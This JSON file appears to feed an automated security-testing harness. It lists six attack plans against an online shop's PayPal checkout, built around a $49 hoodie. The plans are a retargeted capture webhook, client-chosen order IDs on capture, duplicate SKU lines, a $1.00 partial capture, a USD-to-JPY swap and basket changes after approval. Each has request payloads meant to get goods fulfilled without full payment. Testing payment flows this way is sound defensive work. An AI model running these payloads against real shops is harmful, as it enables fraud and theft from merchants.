{
  "plans": [
    {
      "name": "Retargeted capture webhook",
      "idea": "The webhook handler trusts resource.custom_id and does not check that the capture was already consumed by another order or that its related PayPal order matches the target order.",
      "expect": "One $49 payment fulfills the legitimate order plus a second unpaid hoodie order.",
      "steps": [
        {
          "do": "buy",
          "tamper": {},
          "blockCapture": false,
          "save": "b"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders",
          "body": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              }
            ]
          },
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "webhook",
          "event": "PAYMENT.CAPTURE.COMPLETED",
          "edit": {
            "resource.custom_id": "{{a.body.orderId}}",
            "resource.invoice_id": "{{a.body.orderId}}",
            "resource.supplementary_data.related_ids.order_id": "{{a.body.id}}"
          },
          "signed": true,
          "times": 1
        },
        {
          "do": "request",
          "method": "GET",
          "path": "/api/orders/{{a.body.orderId}}",
          "times": 1,
          "together": false,
          "save": "c"
        }
      ]
    },
    {
      "name": "Capture applied to larger order",
      "idea": "The capture endpoint selects the shop order from client-supplied body fields instead of the shop order immutably bound to the approved PayPal order, and does not compare totals.",
      "expect": "A $49 approval captures and fulfills a separate three-hoodie, $147 order.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders",
          "body": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 3
              }
            ]
          },
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "buy",
          "tamper": {},
          "blockCapture": true,
          "save": "b"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders/{{b.paypalOrderId}}/capture",
          "body": {
            "orderId": "{{a.body.orderId}}",
            "shopOrderId": "{{a.body.orderId}}",
            "custom_id": "{{a.body.orderId}}",
            "invoice_id": "{{a.body.orderId}}",
            "paypalOrderId": "{{b.paypalOrderId}}"
          },
          "times": 1,
          "together": false,
          "save": "c"
        },
        {
          "do": "request",
          "method": "GET",
          "path": "/api/orders/{{a.body.orderId}}",
          "times": 1,
          "together": false,
          "save": "d"
        }
      ]
    },
    {
      "name": "Duplicate SKU-line aggregation",
      "idea": "Each duplicate line has a valid SKU and quantity, but pricing may deduplicate lines by SKU while fulfillment retains every raw line, or the reverse validation mismatch occurs.",
      "expect": "Four hoodies are fulfilled although PayPal was asked for only one $49 hoodie.",
      "steps": [
        {
          "do": "buy",
          "tamper": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              },
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              },
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              },
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              }
            ]
          },
          "blockCapture": false,
          "save": "b"
        },
        {
          "do": "request",
          "method": "GET",
          "path": "/api/orders/{{b.shopOrderId}}",
          "times": 1,
          "together": false,
          "save": "a"
        }
      ]
    },
    {
      "name": "Partial capture, full fulfillment",
      "idea": "Creation and approval are honestly for $49, but the capture stage forwards a client-chosen capture amount or marks the order fulfilled for any completed partial capture without checking the captured total.",
      "expect": "Only $1.00 is captured while the $49 hoodie order becomes fulfilled.",
      "steps": [
        {
          "do": "buy",
          "tamper": {},
          "blockCapture": true,
          "save": "b"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders/{{b.paypalOrderId}}/capture",
          "body": {
            "amount": {
              "currency_code": "USD",
              "value": "1.00"
            },
            "final_capture": true
          },
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "request",
          "method": "GET",
          "path": "/api/orders/{{b.shopOrderId}}",
          "times": 1,
          "together": false,
          "save": "c"
        }
      ]
    },
    {
      "name": "Currency-unit confusion",
      "idea": "The numeric amount remains 49.00, but a client-supplied currency changes the PayPal charge to yen while the shop compares only the numeric value or treats the result as USD.",
      "expect": "The buyer approves ¥49 instead of $49, yet the $49 hoodie order is fulfilled.",
      "steps": [
        {
          "do": "buy",
          "tamper": {
            "currency": "JPY",
            "currency_code": "JPY",
            "amount": {
              "currency_code": "JPY",
              "value": "49.00"
            },
            "purchase_units": [
              {
                "reference_id": "default",
                "amount": {
                  "currency_code": "JPY",
                  "value": "49.00"
                }
              }
            ]
          },
          "blockCapture": false,
          "save": "b"
        },
        {
          "do": "request",
          "method": "GET",
          "path": "/api/orders/{{b.shopOrderId}}",
          "times": 1,
          "together": false,
          "save": "a"
        }
      ]
    },
    {
      "name": "Post-approval basket mutation",
      "idea": "After a $49 PayPal order is approved, a second create-order call supplying the existing PayPal and shop IDs may upsert or rebind that payment to a larger basket instead of treating the approved basket as immutable.",
      "expect": "Capturing the original $49 approval fulfills a mutated five-hoodie order.",
      "steps": [
        {
          "do": "buy",
          "tamper": {},
          "blockCapture": true,
          "save": "b"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders",
          "body": {
            "id": "{{b.paypalOrderId}}",
            "paypalOrderId": "{{b.paypalOrderId}}",
            "orderId": "{{b.shopOrderId}}",
            "custom_id": "{{b.shopOrderId}}",
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 5
              }
            ]
          },
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders/{{b.paypalOrderId}}/capture",
          "body": {},
          "times": 1,
          "together": false,
          "save": "c"
        },
        {
          "do": "request",
          "method": "GET",
          "path": "/api/orders/{{b.shopOrderId}}",
          "times": 1,
          "together": false,
          "save": "d"
        },
        {
          "do": "request",
          "method": "GET",
          "path": "/api/orders/{{a.body.orderId}}",
          "times": 1,
          "together": false,
          "save": "e"
        }
      ]
    }
  ]
}